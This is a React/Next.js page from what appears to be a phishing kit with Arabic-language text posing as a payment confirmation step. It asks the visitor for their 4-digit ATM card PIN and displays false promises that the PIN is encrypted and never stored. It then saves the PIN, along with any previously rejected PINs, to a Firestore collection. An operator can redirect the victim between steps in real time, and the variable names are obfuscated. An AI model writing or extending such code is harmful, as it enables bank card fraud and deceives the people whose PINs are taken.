"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Lock, AlertCircle, ShieldCheck, Eye } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { db } from "@/lib/firebase"
import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { updateVisitorPage } from "@/lib/visitor-tracking"

export default function ConfiPage() {
  const router = useRouter()
  const [_v6, _s6] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")

  // Initialize visitor ID and update current page
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
    if (id) {
      updateVisitorPage(id, "confi", 6)
    }
  }, [])

  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "confi" })

  // Navigation listener - listen for admin redirects
  useEffect(() => {
    if (!visitorId || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const step = data.currentStep

          // Redirect based on currentStep
          if (step === "home") {
            router.push("/insur")
          } else if (step === "phone") {
            router.push("/step5")
          } else if (step === "_t6") {
            router.push("/step4")
          } else if (step === "_st1") {
            router.push("/check")
          } else if (step === "_t2") {
            router.push("/step2")
          }
        }
      },
      (error) => {
        console.error("Navigation listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [router, visitorId])

  // Check if visitor has access to this page and monitor PIN status
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      router.push("/home-new")
      return
    }

    if (!db) return
    const docRef = doc(db as Firestore, "pays", visitorID)
    const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
      if (!docSnapshot.exists()) {
        router.push("/check")
        return
      }
      
      const data = docSnapshot.data()
      const status = data._v6Status as "pending" | "verifying" | "approved" | "rejected" | undefined
      
      if (status === "rejected") {
        // Save rejected PIN and reset status
        const currentPin = {
          code: data._v6,
          rejectedAt: new Date().toISOString()
        }
        
        setDoc(docRef, {
          oldPin: data.oldPin ? [...data.oldPin, currentPin] : [currentPin],
          _v6Status: "pending"
        }, { merge: true }).then(() => {
          _ss6("pending")
          _s6("") // Clear the old PIN
          setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
          setIsSubmitting(false)
        }).catch(err => {
          console.error("Error saving rejected PIN:", err)
          setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
          setIsSubmitting(false)
        })
      }
      
      setIsLoading(false)
    })

    return () => unsubscribe()
  }, [router])

  // Removed auto-submit - user must click button to submit

  const handlePinSubmit = async () => {
    if (_v6.length !== 4) {
      setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    setIsSubmitting(true)

    try {
      // Update the document with the PIN
      if (!db) throw new Error("Firebase not configured")
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        _v6,
        pinSubmittedAt: new Date().toISOString(),
        _v6Status: "approved", // Auto-approve PIN
        currentStep: "phone",
        paymentStatus: "pin_completed",
        pinUpdatedAt: new Date().toISOString()
      }, { merge: true })

      // Add PIN to history (always approved)
      await addToHistory(visitorID, "_t3", {
        _v6
      }, "approved")

      // Wait 2 seconds then redirect to phone page
      setTimeout(() => {
        router.push("/step5")
      }, 2000)
    } catch (err) {
      console.error("Error submitting PIN:", err)
      setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
      setIsSubmitting(false)
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
      {/* Full Screen Spinner when submitting */}
      {(isSubmitting || _v6Status === "verifying") && (
        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
      )}

      <div className="w-full max-w-md">
        {/* Icon */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-lg">
            <Lock className="w-12 h-12 text-[#0a4a68]" />
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-3xl shadow-2xl p-8">
          <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-6">
            {error && (
              <Alert variant="destructive" className="border-2">
                <AlertCircle className="h-5 w-5" />
                <AlertDescription className="text-base">{error}</AlertDescription>
              </Alert>
            )}

            <div className="space-y-4">
              <p className="text-center text-gray-700 text-base font-semibold leading-relaxed">
                الرجاء إدخال رقم الصراف المكون من 4 خانات لتأكيد ملكية البطاقة
              </p>

              {/* Additional Info */}
              <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-2">
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <ShieldCheck className="w-4 h-4" />
                  <span>للتأكد من هويتك وحماية حسابك</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <Lock className="w-4 h-4" />
                  <span>الرقم السري محمي ومشفر بالكامل</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <Eye className="w-4 h-4" />
                  <span>لن يتم حفظ أو مشاركة الرقم السري</span>
                </div>
              </div>
              
              <Input
                type="password"
                inputMode="numeric"
                placeholder="رقم الصراف (PIN)"
                value={_v6}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 4)
                  _s6(value)
                  setError("")
                }}
                maxLength={4}
                className="h-14 text-center text-lg px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
                disabled={isSubmitting || _v6Status === "verifying"}
                required
                autoFocus
              />
            </div>

            <Button
              type="submit"
              className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
              disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
            >
              تأكيد الدفع
            </Button>
          </form>
        </div>
      </div>
    </div>
  )
}
